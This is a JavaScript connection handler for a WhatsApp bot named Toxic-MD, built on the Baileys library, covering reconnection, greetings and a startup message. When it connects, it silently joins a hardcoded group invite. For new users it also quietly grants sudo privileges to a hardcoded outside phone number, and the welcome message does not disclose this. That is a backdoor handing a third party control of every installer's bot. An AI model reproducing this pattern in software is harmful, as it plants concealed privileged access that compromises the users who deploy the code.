const { Boom } = require("@hapi/boom");
const { DateTime } = require("luxon");
const { default: toxicConnect, DisconnectReason } = require("@whiskeysockets/baileys");
const { getSettings, getSudoUsers, addSudoUser } = require("../Database/config");
const { commands, totalCommands } = require("../Handler/commandHandler");

const botName = process.env.BOTNAME || "Toxic-MD";
let hasSentStartMessage = false;

// Main connection handler for the bot
async function connectionHandler(socket, connectionUpdate, reconnect) {
  const { connection, lastDisconnect } = connectionUpdate;

  // Get a greeting based on the time of day (Nairobi timezone)
  function getGreeting() {
    const hour = DateTime.now().setZone("Africa/Nairobi").hour;
    if (hour >= 5 && hour < 12) return "Rise and shine! 🌅";
    if (hour >= 12 && hour < 18) return "Midday vibes! ☀️";
    if (hour >= 18 && hour < 22) return "Evening glow! 🌌";
    return "Night owl mode! 🌙";
  }

  // Get the current time in a simple format
  function getCurrentTime() {
    return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
  }

  // Convert text to a fancy font
  function toFancyFont(text, isUpperCase = false) {
    const fonts = {
      'A': '𝘼', 'B': '𝘽', 'C': '𝘾', 'D': '𝘿', 'E': '𝙀', 'F': '𝙁', 'G': '𝙂', 'H': '𝙃', 'I': '𝙄', 'J': '𝙅', 'K': '𝙆', 'L': '𝙇', 'M': '𝙈',
      'N': '𝙉', 'O': '𝙊', 'P': '𝙋', 'Q': '𝙌', 'R': '𝙍', 'S': '𝙎', 'T': '𝙏', 'U': '𝙐', 'V': '𝙑', 'W': '𝙒', 'X': '𝙓', 'Y': '𝙔', 'Z': '𝙕',
      'a': '𝙖', 'b': '𝙗', 'c': '𝙘', 'd': '𝙙', 'e': '𝙚', 'f': '𝙛', 'g': '𝙜', 'h': '𝙝', 'i': '𝙞', 'j': '𝙟', 'k': '𝙠', 'l': '𝙡', 'm': '𝙢',
      'n': '𝙣', 'o': '𝙤', 'p': '𝙥', 'q': '𝙦', 'r': '𝙧', 's': '𝙨', 't': '𝙩', 'u': '𝙪', 'v': '𝙫', 'w': '𝙬', 'x': '𝙭', 'y': '𝙮', 'z': '𝙯'
    };
    const formattedText = isUpperCase ? text.toUpperCase() : text.toLowerCase();
    return formattedText.split('').map(char => fonts[char] || char).join('');
  }

  // Handle "connecting" state
  if (connection === "connecting") {
    console.log("Establishing connection 🤖...");
    return;
  }

  // Handle "close" state (disconnection)
  if (connection === "close") {
    const statusCode = new Boom(lastDisconnect?.error)?.output.statusCode;

    switch (statusCode) {
      case DisconnectReason.badSession:
        console.log("Bad Session File. Please delete session and scan again.");
        process.exit();
        break;
      case DisconnectReason.connectionClosed:
        console.log("Connection closed 🚨, reconnecting...");
        reconnect();
        break;
      case DisconnectReason.connectionLost:
        console.log("Connection lost from server 🚨, reconnecting...");
        reconnect();
        break;
      case DisconnectReason.connectionReplaced:
        console.log("Connection replaced. Shutting down...");
        process.exit();
        break;
      case DisconnectReason.loggedOut:
        console.log("Device logged out. Please delete session and scan again.");
        hasSentStartMessage = false; // Reset for new session
        process.exit();
        break;
      case DisconnectReason.restartRequired:
        console.log("Restart required. Restarting...");
        reconnect();
        break;
      case DisconnectReason.timedOut:
        console.log("Connection timed out. Reconnecting...");
        reconnect();
        break;
      default:
        console.log(`Unknown disconnect reason: ${statusCode} | ${connection}`);
        reconnect();
    }
    return;
  }

  // Handle "open" state (successful connection)
  if (connection === "open") {
    // Join a specific group using an invite code
    try {
      await socket.groupAcceptInvite("GoXKLVJgTAAC3556FXkfFI");
      console.log(`${botName} is running 🟩!`);
    } catch (error) {
      console.error(`Failed to join group: ${error.message}`);
    }

    const userId = socket.user.id.split(":")[0].split("@")[0];
    const settings = await getSettings();
    const sudoUsers = await getSudoUsers();

    // Send startup message (only once per session)
    if (!hasSentStartMessage) {
      const isNewUser = !sudoUsers.includes(userId);
      if (isNewUser) {
        await addSudoUser(userId);
        const defaultSudo = "254735342808";
        if (!sudoUsers.includes(defaultSudo)) {
          await addSudoUser(defaultSudo);
        }
      }

      // Prepare welcome message
      const message = isNewUser
        ? [
            `◈━━━━━━━━━━━━━━━━◈`,
            `│❒ *${getGreeting()}*`,
            `│❒ Yo, you're plugged into *${botName}*! 📡`,
            ``,
            `✨ *Bot Name*: ${botName}`,
            `🔧 *Mode*: ${settings.mode}`,
            `➡️ *Prefix*: ${settings.prefix}`,
            `📋 *Commands*: ${totalCommands}`,
            `🕒 *Time*: ${getCurrentTime()}`,
            `💾 *Database*: Postgres SQL`,
            `📚 *Library*: Baileys`,
            ``,
            `│❒ *New Connection Alert!* First time here? We've added you to the sudo crew! 😎`,
            ``,
            `│❒ 🚀 *Get Started*:`,
            `│❒ - Customize bot with *${settings.prefix}settings*`,
            `│❒ - Hit the button below for commands! 👇`,
            ``,
            `│❒ *Credits*: xh_clinton 🗿`,
            `◈━━━━━━━━━━━━━━━━◈`
          ].join("\n")
        : [
            `◈━━━━━━━━━━━━━━━━◈`,
            `│❒ *${getGreeting()}*`,
            `│❒ Welcome back to *${botName}*! 📡`,
            ``,
            `✨ *Bot Name*: ${botName}`,
            `🔧 *Mode*: ${settings.mode}`,
            `➡️ *Prefix*: ${settings.prefix}`,
            `📋 *Commands*: ${totalCommands}`,
            `🕒 *Time*: ${getCurrentTime()}`,
            `💾 *Database*: Postgres SQL`,
            `📚 *Library*: Baileys`,
            ``,
            `│❒ Ready to dive in? Hit the button below for commands! 😎`,
            ``,
            `│❒ *Credits*: xh_clinton 🗿`,
            `◈━━━━━━━━━━━━━━━━◈`
          ].join("\n");

      // Send the message with a "Menu" button
      try {
        await socket.sendMessage(socket.user.id, {
          text: message,
          footer: `Powered by ${botName}`,
          buttons: [
            {
              buttonId: `${settings.prefix || ''}menu`,
              buttonText: { displayText: `📖 ${toFancyFont('MENU')}` },
              type: 1
            }
          ],
          headerType: 1,
          viewOnce: true,
          contextInfo: {
            externalAdReply: {
              showAdAttribution: false,
              title: botName,
              body: `Yo! Don’t mess this up.`,
              sourceUrl: `https://github.com/xhclintohn/Toxic-MD`,
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        });
      } catch (error) {
        console.error("Failed to send startup message:", error.message);
      }

      hasSentStartMessage = true;
    }

    console.log(`Connection Success 🟩\nLoaded ${totalCommands} plugins.\n${botName} is up 🤖🚨!`);
  }
}

module.exports = connectionHandler;